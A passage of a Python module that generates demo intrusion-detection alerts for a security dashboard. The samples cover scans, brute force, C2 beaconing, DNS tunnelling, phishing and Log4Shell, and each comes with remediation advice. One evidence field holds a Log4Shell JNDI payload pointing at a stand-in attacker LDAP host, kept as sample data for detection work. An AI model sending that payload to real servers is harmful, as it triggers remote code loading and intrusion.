# =============================================================================
# incidentes/demo.py  v2
#
# Mudanças v2:
#   ✓ get_demo_stats() usa sufixo _incidentes (backend v10.1)
#   ✓ get_demo_eventos() inclui first_seen, last_seen, ocorrencias
#     (formato igual ao _incidente_para_evento() do views.py)
#   ✓ get_demo_contexto() inclui baixos no risk_score
#   ✓ get_demo_timeline() status usa 'falso' (não 'falso_positivo')
# =============================================================================

import copy
import random
from datetime import datetime, timedelta


# =============================================================================
# UTILITÁRIOS
# =============================================================================

def _extrair_asn_number(asn_org: str) -> str:
    """Extrai 'AS12389' de 'AS12389 Rostelecom'."""
    if not asn_org:
        return "—"
    partes = asn_org.split()
    if partes and partes[0].upper().startswith("AS"):
        return partes[0].upper()
    return "—"


# =============================================================================
# EVENTOS BASE
# =============================================================================

_DEMO_EVENTOS_BASE = [
    # ── CRÍTICOS ─────────────────────────────────────────────────────────────
    {
        "id": "demo-1", "sensor": "sensor-demo", "status": "novo", "fonte": "IDS",
        "classificacao": "incidente", "score_evento": 95,
        "group_key": "demo-grp-1", "group_count": 4,
        "titulo_jg": "Varredura Nmap Detectada",
        "resumo_jg": "Ferramenta de reconhecimento Nmap identificada — mapeamento ativo de portas e serviços na rede. Padrão consistente com reconhecimento pré-ataque.",
        "categoria_jg": "recon", "severidade_jg": "critico",
        "tags_jg": ["nmap", "scan", "reconhecimento", "externo"],
        "recomendacoes": [
            "Bloqueie o IP 185.220.101.47 no firewall imediatamente.",
            "Verifique se algum serviço foi comprometido nas portas varridas.",
            "Revise os logs de acesso nas últimas 2 horas.",
        ],
        "evidencia": "SYN flood em 1.200 portas distintas em 30 segundos",
        "tecnico": {
            "signature": "ET SCAN Nmap Scripting Engine User-Agent Detected",
            "sid": "2008578", "categoria": "Attempted Information Leak",
            "severidade": 2, "protocolo": "TCP",
            "src_ip": "185.220.101.47", "src_porta": 54821,
            "dest_ip": "192.168.1.1", "dest_porta": 22,
            "direction": "inbound", "acao": "alert", "rev": 4,
        },
        "srcIp": "185.220.101.47", "dstIp": "192.168.1.1", "sev": 2,
        "sig": {"name": "ET SCAN Nmap Scripting Engine", "sid": "2008578",
                "cat": "Attempted Information Leak", "sev": 2, "port": 22,
                "proto": "TCP", "action": "alert", "rev": 4},
        "pais_codigo": "RU", "pais": "Rússia", "cidade": "Moscou",
        "asn_org": "AS12389 Rostelecom", "asn_number": "AS12389", "rdns": "tor-exit.example.ru",
        "latitude": 55.7558, "longitude": 37.6173, "flag": "🇷🇺",
        "country": {"flag": "🇷🇺", "name": "Rússia", "code": "RU"},
        "direction": "inbound", "src_is_local": False, "dst_is_local": True,
        "risk_score": 92.5, "raw_json": None, "_min": 3, "_ocorrencias": 4,
    },
    {
        "id": "demo-2", "sensor": "sensor-demo", "status": "investigando", "fonte": "IDS",
        "classificacao": "incidente", "score_evento": 91,
        "group_key": "demo-grp-2", "group_count": 12,
        "titulo_jg": "Força Bruta SSH Detectada",
        "resumo_jg": "Mais de 200 tentativas de login SSH falhadas em 2 horas provenientes do mesmo IP. Possível ataque de dicionário em andamento.",
        "categoria_jg": "auth", "severidade_jg": "critico",
        "tags_jg": ["brute-force", "ssh", "credenciais"],
        "recomendacoes": [
            "Bloqueie o IP 45.33.32.156 no firewall.",
            "Considere migrar SSH para porta não-padrão.",
            "Ative autenticação por chave e desabilite senha.",
            "Instale fail2ban se ainda não estiver configurado.",
        ],
        "evidencia": "217 tentativas de autenticação SSH falhadas — usuários: root, admin, ubuntu",
        "tecnico": {
            "signature": "ET BRUTE_FORCE SSH Brute Force Attempt",
            "sid": "2001219", "categoria": "Attempted Administrator Privilege Gain",
            "severidade": 1, "protocolo": "TCP",
            "src_ip": "45.33.32.156", "src_porta": 39201,
            "dest_ip": "192.168.1.10", "dest_porta": 22,
            "direction": "inbound", "acao": "alert", "rev": 8,
        },
        "srcIp": "45.33.32.156", "dstIp": "192.168.1.10", "sev": 1,
        "sig": {"name": "ET BRUTE_FORCE SSH Brute Force Attempt", "sid": "2001219",
                "cat": "Attempted Administrator Privilege Gain", "sev": 1, "port": 22,
                "proto": "TCP", "action": "alert", "rev": 8},
        "pais_codigo": "CN", "pais": "China", "cidade": "Pequim",
        "asn_org": "AS4134 CHINANET", "asn_number": "AS4134", "rdns": "",
        "latitude": 39.9042, "longitude": 116.4074, "flag": "🇨🇳",
        "country": {"flag": "🇨🇳", "name": "China", "code": "CN"},
        "direction": "inbound", "src_is_local": False, "dst_is_local": True,
        "risk_score": 88.0, "raw_json": None, "_min": 7, "_ocorrencias": 12,
    },
    {
        "id": "demo-3", "sensor": "sensor-demo", "status": "novo", "fonte": "IDS",
        "classificacao": "incidente", "score_evento": 87,
        "group_key": "demo-grp-3", "group_count": 1,
        "titulo_jg": "Comunicação C2 via TLS Detectada",
        "resumo_jg": "Dispositivo interno iniciando conexão com servidor de Comando e Controle conhecido. Tráfego TLS com padrão de beaconing — possível infecção por malware.",
        "categoria_jg": "malware", "severidade_jg": "critico",
        "tags_jg": ["c2", "beaconing", "malware", "tls"],
        "recomendacoes": [
            "Isole o dispositivo 192.168.1.55 da rede imediatamente.",
            "Execute varredura antivírus completa no host.",
            "Analise processos em execução em busca de comportamento suspeito.",
            "Preserve evidências antes de qualquer remediação.",
        ],
        "evidencia": "Conexão TLS para 91.108.4.1:443 — domínio em blacklist de C2",
        "tecnico": {
            "signature": "ET MALWARE Possible TLS C2 Beaconing",
            "sid": "2025000", "categoria": "A Network Trojan was Detected",
            "severidade": 1, "protocolo": "TCP",
            "src_ip": "192.168.1.55", "src_porta": 49123,
            "dest_ip": "91.108.4.1", "dest_porta": 443,
            "direction": "outbound", "acao": "alert", "rev": 2,
        },
        "srcIp": "192.168.1.55", "dstIp": "91.108.4.1", "sev": 1,
        "sig": {"name": "ET MALWARE Possible TLS C2 Beaconing", "sid": "2025000",
                "cat": "A Network Trojan was Detected", "sev": 1, "port": 443,
                "proto": "TCP", "action": "alert", "rev": 2},
        "pais_codigo": "NL", "pais": "Países Baixos", "cidade": "Amsterdã",
        "asn_org": "AS396982 Google LLC", "asn_number": "AS396982", "rdns": "broadband.example.nl",
        "latitude": 52.3676, "longitude": 4.9041, "flag": "🇳🇱",
        "country": {"flag": "🇳🇱", "name": "Países Baixos", "code": "NL"},
        "direction": "outbound", "src_is_local": True, "dst_is_local": False,
        "risk_score": 85.0, "raw_json": None, "_min": 15, "_ocorrencias": 1,
    },
    {
        "id": "demo-4", "sensor": "sensor-demo", "status": "novo", "fonte": "IDS",
        "classificacao": "incidente", "score_evento": 72,
        "group_key": "demo-grp-4", "group_count": 3,
        "titulo_jg": "Exploit Apache Log4Shell Tentado",
        "resumo_jg": "Tentativa de exploração da vulnerabilidade Log4Shell (CVE-2021-44228) detectada contra servidor web interno.",
        "categoria_jg": "web", "severidade_jg": "alto",
        "tags_jg": ["log4shell", "cve-2021-44228", "rce", "exploit"],
        "recomendacoes": [
            "Verifique se o servidor alvo possui Log4j e atualize para ≥ 2.17.1.",
            "Bloqueie o IP de origem no WAF.",
            "Inspecione os logs do servidor por execuções suspeitas.",
        ],
        "evidencia": "Payload ${jndi:ldap://malicious.example.com/a} no header User-Agent",
        "tecnico": {
            "signature": "ET EXPLOIT Apache Log4j RCE Attempt",
            "sid": "2034700", "categoria": "Attempted Administrator Privilege Gain",
            "severidade": 1, "protocolo": "TCP",
            "src_ip": "198.51.100.23", "src_porta": 52001,
            "dest_ip": "192.168.1.20", "dest_porta": 8080,
            "direction": "inbound", "acao": "alert", "rev": 5,
        },
        "srcIp": "198.51.100.23", "dstIp": "192.168.1.20", "sev": 1,
        "sig": {"name": "ET EXPLOIT Apache Log4j RCE Attempt", "sid": "2034700",
                "cat": "Attempted Administrator Privilege Gain", "sev": 1, "port": 8080,
                "proto": "TCP", "action": "alert", "rev": 5},
        "pais_codigo": "BR", "pais": "Brasil", "cidade": "São Paulo",
        "asn_org": "AS28573 Claro S.A.", "asn_number": "AS28573", "rdns": "",
        "latitude": -23.5505, "longitude": -46.6333, "flag": "🇧🇷",
        "country": {"flag": "🇧🇷", "name": "Brasil", "code": "BR"},
        "direction": "inbound", "src_is_local": False, "dst_is_local": True,
        "risk_score": 71.0, "raw_json": None, "_min": 22, "_ocorrencias": 3,
    },
    {
        "id": "demo-5", "sensor": "sensor-demo", "status": "novo", "fonte": "IDS",
        "classificacao": "incidente", "score_evento": 68,
        "group_key": "demo-grp-5", "group_count": 7,
        "titulo_jg": "Tunelamento DNS Suspeito",
        "resumo_jg": "Host interno consultando subdomínios excessivamente longos e codificados. Padrão típico de tunelamento DNS para exfiltração de dados.",
        "categoria_jg": "dns", "severidade_jg": "alto",
        "tags_jg": ["dns-tunneling", "exfiltração", "dados"],
        "recomendacoes": [
            "Bloqueie consultas DNS com subdomínios > 50 caracteres.",
            "Analise o histórico DNS do host 192.168.1.33.",
            "Considere implementar DNS over HTTPS interno.",
        ],
        "evidencia": "63 consultas para *.d2h8k3j9.attacker.io nos últimos 10 min",
        "tecnico": {
            "signature": "ET DNS Possible DNS Tunneling",
            "sid": "2027863", "categoria": "Potentially Bad Traffic",
            "severidade": 2, "protocolo": "UDP",
            "src_ip": "192.168.1.33", "src_porta": 53422,
            "dest_ip": "8.8.8.8", "dest_porta": 53,
            "direction": "outbound", "acao": "alert", "rev": 3,
        },
        "srcIp": "192.168.1.33", "dstIp": "8.8.8.8", "sev": 2,
        "sig": {"name": "ET DNS Possible DNS Tunneling", "sid": "2027863",
                "cat": "Potentially Bad Traffic", "sev": 2, "port": 53,
                "proto": "UDP", "action": "alert", "rev": 3},
        "pais_codigo": "US", "pais": "Estados Unidos", "cidade": "Mountain View",
        "asn_org": "AS15169 Google LLC", "asn_number": "AS15169", "rdns": "dns.google",
        "latitude": 37.4221, "longitude": -122.0841, "flag": "🇺🇸",
        "country": {"flag": "🇺🇸", "name": "Estados Unidos", "code": "US"},
        "direction": "outbound", "src_is_local": True, "dst_is_local": False,
        "risk_score": 65.0, "raw_json": None, "_min": 35, "_ocorrencias": 7,
    },
    {
        "id": "demo-11", "sensor": "sensor-demo", "status": "novo", "fonte": "IDS",
        "classificacao": "incidente", "score_evento": 74,
        "group_key": "demo-grp-11", "group_count": 2,
        "titulo_jg": "Ataque de Força Bruta RDP",
        "resumo_jg": "Tentativas de conexão RDP vindas de IPs externos em múltiplos países. Serviço de área de trabalho remota acessível publicamente é um vetor crítico de ransomware.",
        "categoria_jg": "auth", "severidade_jg": "alto",
        "tags_jg": ["rdp", "brute-force", "ransomware", "exposição"],
        "recomendacoes": [
            "Restrinja acesso RDP (porta 3389) apenas a IPs conhecidos via firewall.",
            "Ative autenticação em nível de rede (NLA).",
            "Considere uso de VPN para acesso remoto em vez de RDP direto.",
        ],
        "evidencia": "38 tentativas de login RDP de 6 IPs distintos em 15 min",
        "tecnico": {
            "signature": "ET BRUTE_FORCE RDP Login Attempt",
            "sid": "2001420", "categoria": "Attempted Administrator Privilege Gain",
            "severidade": 1, "protocolo": "TCP",
            "src_ip": "91.240.118.57", "src_porta": 49200,
            "dest_ip": "192.168.1.5", "dest_porta": 3389,
            "direction": "inbound", "acao": "alert", "rev": 6,
        },
        "srcIp": "91.240.118.57", "dstIp": "192.168.1.5", "sev": 1,
        "sig": {"name": "ET BRUTE_FORCE RDP Login Attempt", "sid": "2001420",
                "cat": "Attempted Administrator Privilege Gain", "sev": 1, "port": 3389,
                "proto": "TCP", "action": "alert", "rev": 6},
        "pais_codigo": "RO", "pais": "Romênia", "cidade": "Bucareste",
        "asn_org": "AS8708 RCS & RDS SA", "asn_number": "AS8708", "rdns": "",
        "latitude": 44.4268, "longitude": 26.1025, "flag": "🇷🇴",
        "country": {"flag": "🇷🇴", "name": "Romênia", "code": "RO"},
        "direction": "inbound", "src_is_local": False, "dst_is_local": True,
        "risk_score": 74.0, "raw_json": None, "_min": 28, "_ocorrencias": 2,
    },
    {
        "id": "demo-10", "sensor": "sensor-demo", "status": "novo", "fonte": "IDS",
        "classificacao": "evento", "score_evento": 55,
        "group_key": "demo-grp-10", "group_count": 1,
        "titulo_jg": "Conexão com Nó Tor Detectada",
        "resumo_jg": "Dispositivo interno estabeleceu conexão com nó de saída Tor conhecido. Pode indicar tentativa de anonimização ou bypass de controles.",
        "categoria_jg": "p2p", "severidade_jg": "alto",
        "tags_jg": ["tor", "anonimização", "p2p"],
        "recomendacoes": [
            "Identifique qual usuário/processo iniciou a conexão.",
            "Considere bloquear saída para portas 9001 e 9030.",
            "Verifique se há outros dispositivos com comportamento similar.",
        ],
        "evidencia": "Handshake TLS para 176.10.104.240:9001 — nó Tor confirmado via lista pública",
        "tecnico": {
            "signature": "ET TOR Known Tor Exit Node Traffic",
            "sid": "2522090", "categoria": "Misc Activity",
            "severidade": 2, "protocolo": "TCP",
            "src_ip": "192.168.1.44", "src_porta": 50900,
            "dest_ip": "176.10.104.240", "dest_porta": 9001,
            "direction": "outbound", "acao": "alert", "rev": 3,
        },
        "srcIp": "192.168.1.44", "dstIp": "176.10.104.240", "sev": 2,
        "sig": {"name": "ET TOR Known Tor Exit Node Traffic", "sid": "2522090",
                "cat": "Misc Activity", "sev": 2, "port": 9001,
                "proto": "TCP", "action": "alert", "rev": 3},
        "pais_codigo": "DE", "pais": "Alemanha", "cidade": "Frankfurt",
        "asn_org": "AS24940 Hetzner Online GmbH", "asn_number": "AS24940", "rdns": "",
        "latitude": 50.1109, "longitude": 8.6821, "flag": "🇩🇪",
        "country": {"flag": "🇩🇪", "name": "Alemanha", "code": "DE"},
        "direction": "outbound", "src_is_local": True, "dst_is_local": False,
        "risk_score": 58.0, "raw_json": None, "_min": 48, "_ocorrencias": 1,
    },
    {
        "id": "demo-6", "sensor": "sensor-demo", "status": "novo", "fonte": "IDS",
        "classificacao": "evento", "score_evento": 45,
        "group_key": "demo-grp-6", "group_count": 2,
        "titulo_jg": "Acesso a Site de Phishing",
        "resumo_jg": "Dispositivo interno acessou URL catalogada como phishing por feeds de inteligência de ameaças.",
        "categoria_jg": "web", "severidade_jg": "medio",
        "tags_jg": ["phishing", "url-maliciosa"],
        "recomendacoes": [
            "Notifique o usuário do dispositivo sobre o risco.",
            "Verifique se houve envio de credenciais.",
            "Adicione o domínio à blocklist do DNS.",
        ],
        "evidencia": "GET http://secure-paypal-login.phish.tk/update",
        "tecnico": {
            "signature": "ET PHISHING Possible Phishing Domain",
            "sid": "2016778", "categoria": "Potentially Bad Traffic",
            "severidade": 2, "protocolo": "TCP",
            "src_ip": "192.168.1.77", "src_porta": 50123,
            "dest_ip": "103.224.182.246", "dest_porta": 80,
            "direction": "outbound", "acao": "alert", "rev": 6,
        },
        "srcIp": "192.168.1.77", "dstIp": "103.224.182.246", "sev": 2,
        "sig": {"name": "ET PHISHING Possible Phishing Domain", "sid": "2016778",
                "cat": "Potentially Bad Traffic", "sev": 2, "port": 80,
                "proto": "TCP", "action": "alert", "rev": 6},
        "pais_codigo": "TK", "pais": "Tokelau", "cidade": "—",
        "asn_org": "AS133478 Fast Bandwidth", "asn_number": "AS133478", "rdns": "",
        "latitude": -9.2, "longitude": -171.8, "flag": "🌐",
        "country": {"flag": "🌐", "name": "Tokelau", "code": "TK"},
        "direction": "outbound", "src_is_local": True, "dst_is_local": False,
        "risk_score": 42.0, "raw_json": None, "_min": 62, "_ocorrencias": 2,
    },
    {
        "id": "demo-7", "sensor": "sensor-demo", "status": "resolvido", "fonte": "IDS",
        "classificacao": "evento", "score_evento": 40,
        "group_key": "demo-grp-7", "group_count": 5,
        "titulo_jg": "Varredura SMB Detectada",
        "resumo_jg": "Host externo tentando enumerar compartilhamentos SMB na rede. Pode indicar reconhecimento para exploração de EternalBlue.",
        "categoria_jg": "lateral", "severidade_jg": "medio",
        "tags_jg": ["smb", "lateral-movement", "wannacry"],
        "recomendacoes": [
            "Bloqueie acesso externo à porta 445 no perímetro.",
            "Confirme que patches MS17-010 estão aplicados.",
        ],
        "evidencia": "5 tentativas de negociação SMBv1 de IP externo",
        "tecnico": {
            "signature": "ET SCAN SMB NT Trans Request",
            "sid": "2003068", "categoria": "Attempted Information Leak",
            "severidade": 2, "protocolo": "TCP",
            "src_ip": "77.88.55.80", "src_porta": 44500,
            "dest_ip": "192.168.1.1", "dest_porta": 445,
            "direction": "inbound", "acao": "alert", "rev": 7,
        },
        "srcIp": "77.88.55.80", "dstIp": "192.168.1.1", "sev": 2,
        "sig": {"name": "ET SCAN SMB NT Trans Request", "sid": "2003068",
                "cat": "Attempted Information Leak", "sev": 2, "port": 445,
                "proto": "TCP", "action": "alert", "rev": 7},
        "pais_codigo": "UA", "pais": "Ucrânia", "cidade": "Kyiv",
        "asn_org": "AS13188 Yandex LLC", "asn_number": "AS13188", "rdns": "search.yandex.net",
        "latitude": 50.4501, "longitude": 30.5234, "flag": "🇺🇦",
        "country": {"flag": "🇺🇦", "name": "Ucrânia", "code": "UA"},
        "direction": "inbound", "src_is_local": False, "dst_is_local": True,
        "risk_score": 38.5, "raw_json": None, "_min": 80, "_ocorrencias": 5,
    },
    {
        "id": "demo-12", "sensor": "sensor-demo", "status": "novo", "fonte": "IDS",
        "classificacao": "evento", "score_evento": 35,
        "group_key": "demo-grp-12", "group_count": 9,
        "titulo_jg": "Mineração de Criptomoeda Detectada",
        "resumo_jg": "Tráfego de rede compatível com protocolo de pool de mineração (Stratum). Possível cryptojacking em dispositivo da rede.",
        "categoria_jg": "p2p", "severidade_jg": "medio",
        "tags_jg": ["cryptomining", "stratum", "p2p", "cryptojacking"],
        "recomendacoes": [
            "Identifique o processo responsável pelo tráfego no dispositivo 192.168.1.91.",
            "Execute varredura de malware no host.",
            "Bloqueie saída para portas 3333, 4444 e 14444 (Stratum).",
        ],
        "evidencia": "Conexões persistentes para pool.minexmr.com:3333 — protocolo Stratum confirmado",
        "tecnico": {
            "signature": "ET POLICY Cryptocurrency Mining Pool Connection",
            "sid": "2023882", "categoria": "Potentially Bad Traffic",
            "severidade": 2, "protocolo": "TCP",
            "src_ip": "192.168.1.91", "src_porta": 47100,
            "dest_ip": "45.76.1.145", "dest_porta": 3333,
            "direction": "outbound", "acao": "alert", "rev": 4,
        },
        "srcIp": "192.168.1.91", "dstIp": "45.76.1.145", "sev": 2,
        "sig": {"name": "ET POLICY Cryptocurrency Mining Pool Connection", "sid": "2023882",
                "cat": "Potentially Bad Traffic", "sev": 2, "port": 3333,
                "proto": "TCP", "action": "alert", "rev": 4},
        "pais_codigo": "SG", "pais": "Singapura", "cidade": "Singapura",
        "asn_org": "AS20473 Choopa LLC", "asn_number": "AS20473", "rdns": "pool.minexmr.com",
        "latitude": 1.3521, "longitude": 103.8198, "flag": "🇸🇬",
        "country": {"flag": "🇸🇬", "name": "Singapura", "code": "SG"},
        "direction": "outbound", "src_is_local": True, "dst_is_local": False,
        "risk_score": 47.0, "raw_json": None, "_min": 95, "_ocorrencias": 9,
    },
    {
        "id": "demo-8", "sensor": "sensor-demo", "status": "novo", "fonte": "IDS",
        "classificacao": "telemetria", "score_evento": 15,
        "group_key": "demo-grp-8", "group_count": 23,
        "titulo_jg": "Consultas DNS para Serviços de Nuvem",
        "resumo_jg": "Volume elevado de consultas DNS para domínios de CDN e cloud. Comportamento normal, sem indicadores de comprometimento.",
        "categoria_jg": "dns", "severidade_jg": "informativo",
        "tags_jg": ["dns", "cloud", "normal"],
        "recomendacoes": [],
        "evidencia": "23 consultas para *.cloudfront.net e *.amazonaws.com",
        "tecnico": {
            "signature": "ET INFO DNS Query to Cloud Provider",
            "sid": "2035900", "categoria": "Informational",
            "severidade": 3, "protocolo": "UDP",
            "src_ip": "192.168.1.5", "src_porta": 49500,
            "dest_ip": "1.1.1.1", "dest_porta": 53,
            "direction": "outbound", "acao": "alert", "rev": 1,
        },
        "srcIp": "192.168.1.5", "dstIp": "1.1.1.1", "sev": 3,
        "sig": {"name": "ET INFO DNS Query to Cloud Provider", "sid": "2035900",
                "cat": "Informational", "sev": 3, "port": 53,
                "proto": "UDP", "action": "alert", "rev": 1},
        "pais_codigo": "US", "pais": "Estados Unidos", "cidade": "San Francisco",
        "asn_org": "AS13335 Cloudflare Inc.", "asn_number": "AS13335", "rdns": "one.one.one.one",
        "latitude": 37.7749, "longitude": -122.4194, "flag": "🇺🇸",
        "country": {"flag": "🇺🇸", "name": "Estados Unidos", "code": "US"},
        "direction": "outbound", "src_is_local": True, "dst_is_local": False,
        "risk_score": 5.0, "raw_json": None, "_min": 100, "_ocorrencias": 23,
    },
    {
        "id": "demo-9", "sensor": "sensor-demo", "status": "novo", "fonte": "IDS",
        "classificacao": "telemetria", "score_evento": 12,
        "group_key": "demo-grp-9", "group_count": 8,
        "titulo_jg": "Tráfego TLS para Redes Sociais",
        "resumo_jg": "Conexões HTTPS para Facebook, Instagram e Twitter. Tráfego de navegação comum sem indicadores de risco.",
        "categoria_jg": "tls", "severidade_jg": "baixo",
        "tags_jg": ["tls", "redes-sociais", "normal"],
        "recomendacoes": [],
        "evidencia": "SNI: graph.facebook.com, instagram.com, api.twitter.com",
        "tecnico": {
            "signature": "ET INFO TLS Social Media",
            "sid": "2036100", "categoria": "Informational",
            "severidade": 3, "protocolo": "TCP",
            "src_ip": "192.168.1.5", "src_porta": 51200,
            "dest_ip": "31.13.72.36", "dest_porta": 443,
            "direction": "outbound", "acao": "alert", "rev": 1,
        },
        "srcIp": "192.168.1.5", "dstIp": "31.13.72.36", "sev": 3,
        "sig": {"name": "ET INFO TLS Social Media", "sid": "2036100",
                "cat": "Informational", "sev": 3, "port": 443,
                "proto": "TCP", "action": "alert", "rev": 1},
        "pais_codigo": "US", "pais": "Estados Unidos", "cidade": "Menlo Park",
        "asn_org": "AS32934 Facebook Inc.", "asn_number": "AS32934", "rdns": "edge-star-mini.facebook.com",
        "latitude": 37.4530, "longitude": -122.1817, "flag": "🇺🇸",
        "country": {"flag": "🇺🇸", "name": "Estados Unidos", "code": "US"},
        "direction": "outbound", "src_is_local": True, "dst_is_local": False,
        "risk_score": 3.0, "raw_json": None, "_min": 115, "_ocorrencias": 8,
    },
    {
        "id": "demo-13", "sensor": "sensor-demo", "status": "novo", "fonte": "IDS",
        "classificacao": "telemetria", "score_evento": 8,
        "group_key": "demo-grp-13", "group_count": 41,
        "titulo_jg": "Tráfego NTP de Sincronização",
        "resumo_jg": "Sincronização de horário NTP com servidores públicos. Comportamento esperado e necessário para funcionamento correto dos sistemas.",
        "categoria_jg": "anomalia", "severidade_jg": "informativo",
        "tags_jg": ["ntp", "sincronização", "normal"],
        "recomendacoes": [],
        "evidencia": "41 pacotes NTP para pool.ntp.org (UDP/123)",
        "tecnico": {
            "signature": "ET INFO NTP Sync",
            "sid": "2017919", "categoria": "Informational",
            "severidade": 3, "protocolo": "UDP",
            "src_ip": "192.168.1.1", "src_porta": 123,
            "dest_ip": "200.160.7.186", "dest_porta": 123,
            "direction": "outbound", "acao": "alert", "rev": 1,
        },
        "srcIp": "192.168.1.1", "dstIp": "200.160.7.186", "sev": 3,
        "sig": {"name": "ET INFO NTP Sync", "sid": "2017919",
                "cat": "Informational", "sev": 3, "port": 123,
                "proto": "UDP", "action": "alert", "rev": 1},
        "pais_codigo": "BR", "pais": "Brasil", "cidade": "São Paulo",
        "asn_org": "AS22548 NIC.br", "asn_number": "AS22548", "rdns": "a.ntp.br",
        "latitude": -23.5505, "longitude": -46.6333, "flag": "🇧🇷",
        "country": {"flag": "🇧🇷", "name": "Brasil", "code": "BR"},
        "direction": "outbound", "src_is_local": True, "dst_is_local": False,
        "risk_score": 0.0, "raw_json": None, "_min": 130, "_ocorrencias": 41,
    },
]

_DEMO_IP_MAP = {ev["srcIp"]: ev for ev in _DEMO_EVENTOS_BASE}


# =============================================================================
# FUNÇÕES PÚBLICAS
# =============================================================================

def get_demo_eventos() -> list:
    agora = datetime.now()
    resultado = []
    for ev in _DEMO_EVENTOS_BASE:
        ev_copy = copy.deepcopy(ev)
        minutos     = ev_copy.pop("_min", 10)
        ocorrencias = ev_copy.pop("_ocorrencias", ev_copy.get("group_count", 1))

        last_seen  = agora - timedelta(minutes=minutos)
        first_seen = last_seen - timedelta(minutes=minutos + random.randint(20, 60))

        # Campos no formato de _incidente_para_evento() do views.py
        ev_copy["timestamp"]          = last_seen.isoformat()
        ev_copy["last_seen"]          = last_seen.isoformat()
        ev_copy["first_seen"]         = first_seen.isoformat()
        ev_copy["ocorrencias"]        = ocorrencias
        ev_copy["group_count"]        = ocorrencias  # compatibilidade JS
        ev_copy["primeira_ocorrencia"] = first_seen.isoformat()
        resultado.append(ev_copy)
    return resultado


def get_demo_stats() -> dict:
    """
    Retorna stats no formato do backend v10.1:
    ultimas_24h usa sufixo _incidentes para os contadores principais.
    """
    return {
        "ultimas_24h": {
            # Nomes novos (backend v10.1)
            "total_incidentes":       47,
            "criticos_incidentes":    3,
            "altos_incidentes":       5,
            "medios_incidentes":      12,
            "baixos_incidentes":      18,
            "informativos_incidentes": 9,
            "novos_incidentes":       22,
            # Campos extras que o JS também usa
            "investigando": 4,
            "top_categorias": [
                {"categoria_jg": "recon",   "n": 12},
                {"categoria_jg": "auth",    "n": 9},
                {"categoria_jg": "malware", "n": 7},
                {"categoria_jg": "web",     "n": 6},
                {"categoria_jg": "dns",     "n": 5},
            ],
        },
        "dns_24h": 312, "http_24h": 189, "tls_24h": 445,
    }


def get_demo_totais() -> dict:
    return {"incidente": 6, "evento": 4, "telemetria": 3}


def get_demo_contexto(ip: str) -> dict:
    ev = _DEMO_IP_MAP.get(ip)

    if ev:
        geo = {
            "flag":        ev["flag"],
            "pais":        ev["pais"],
            "pais_codigo": ev["pais_codigo"],
            "cidade":      ev["cidade"],
            "asn_number":  ev.get("asn_number") or _extrair_asn_number(ev["asn_org"]),
            "asn_org":     ev["asn_org"],
            "rdns":        ev["rdns"],
            "latitude":    ev["latitude"],
            "longitude":   ev["longitude"],
        }
        score    = ev["risk_score"]
        criticos = 3 if score > 80 else (1 if score > 60 else 0)
        altos    = 5 if score > 60 else 2
        medios   = 8
        baixos   = random.randint(2, 6)
        total_al = criticos + altos + medios + baixos
        top_sids = [{"sid": ev["tecnico"]["sid"], "signature": ev["titulo_jg"], "total": ev["group_count"] + 3}]
        top_doms = [
            {"query": ev["rdns"] or "update.example.com", "total": 12},
            {"query": "cdn.cloudflare.com", "total": 8},
            {"query": "api.github.com", "total": 5},
        ]
        top_uas  = [
            {"ua": "python-requests/2.28.1", "total": 18},
            {"ua": "Mozilla/5.0 (compatible; Nmap Scripting Engine)", "total": 7},
        ]
        direction  = ev["direction"]
        dir_counts = (
            {"inbound": 34, "outbound": 5, "lateral": 2}
            if direction == "inbound"
            else {"inbound": 2, "outbound": 28, "lateral": 3}
        )
    else:
        geo = {
            "flag": "🌐", "pais": "Desconhecido", "pais_codigo": "",
            "cidade": "—", "asn_number": "—", "asn_org": "—",
            "rdns": "", "latitude": 0.0, "longitude": 0.0,
        }
        score    = round(random.uniform(20, 75), 1)
        criticos = random.randint(0, 2)
        altos    = random.randint(1, 4)
        medios   = random.randint(2, 8)
        baixos   = random.randint(2, 6)
        total_al = criticos + altos + medios + baixos
        top_sids = [
            {"sid": "2008578", "signature": "Varredura Nmap Detectada", "total": 9},
            {"sid": "2001219", "signature": "Força Bruta SSH Detectada", "total": 5},
        ]
        top_doms = [
            {"query": "example.com", "total": 14},
            {"query": "update.microsoft.com", "total": 8},
        ]
        top_uas  = [{"ua": "python-requests/2.28.1", "total": 12}]
        dir_counts = {"inbound": 20, "outbound": 8, "lateral": 2}
        direction  = "inbound"

    return {
        "total_alertas":       total_al,
        "total_dns":           random.randint(40, 180),
        "total_http":          random.randint(10, 80),
        "total_tls":           random.randint(5, 60),
        "criticos":            criticos,
        "altos":               altos,
        "medios":              medios,
        "baixos":              baixos,
        "geo":                 geo,
        "risk_score": {
            "score":         score,
            "total_alertas": total_al,
            "criticos":      criticos,
            "altos":         altos,
            "medios":        medios,
            "baixos":        baixos,
            "ultimo_alerta": (datetime.now() - timedelta(minutes=random.randint(5, 120))).isoformat(),
        },
        "direction_counts":    dir_counts,
        "direction_dominant":  max(dir_counts, key=dir_counts.get),
        "top_sids":            top_sids,
        "top_dominios":        top_doms,
        "top_user_agents":     top_uas,
    }


def get_demo_timeline(ip: str, horas: int = 24) -> list:
    agora = datetime.now()
    ev_base = _DEMO_IP_MAP.get(ip)
    eventos = []

    sigs_pool = [
        ("Varredura Nmap Detectada",          "2008578", "alto"),
        ("Força Bruta SSH Detectada",         "2001219", "critico"),
        ("Comunicação C2 via TLS Detectada",  "2025000", "critico"),
        ("Exploit Apache Log4Shell Tentado",  "2034700", "alto"),
        ("Conexão com Nó Tor Detectada",      "2522090", "alto"),
        ("Acesso a Site de Phishing",         "2016778", "medio"),
        ("Varredura SMB Detectada",           "2003068", "medio"),
        ("Tunelamento DNS Suspeito",          "2027863", "alto"),
    ]

    if ev_base:
        sig_principal = (ev_base["titulo_jg"], ev_base["tecnico"]["sid"], ev_base["severidade_jg"])
        sigs_usadas = [sig_principal] + [s for s in sigs_pool if s[1] != ev_base["tecnico"]["sid"]][:3]
    else:
        sigs_usadas = sigs_pool[:4]

    for i, (titulo, sid, sev) in enumerate(sigs_usadas):
        for j in range(random.randint(2, 5)):
            minutos = random.randint(1, horas * 60)
            ts = (agora - timedelta(minutes=minutos)).isoformat()
            eventos.append({
                "tipo":          "alert",
                "timestamp":     ts,
                "severidade":    sev,
                "severidade_jg": sev,
                "titulo":        titulo,
                "titulo_tecnico": titulo,
                "detalhe":       f"{ip}:{random.randint(1024, 65000)} → 192.168.1.{random.randint(1, 20)}:{[22, 80, 443, 3389, 445][i % 5]}",
                "sid":           sid,
                "protocolo":     "TCP",
                "direction":     ev_base["direction"] if ev_base else "inbound",
                # Fix: status usa 'falso' (não 'falso_positivo')
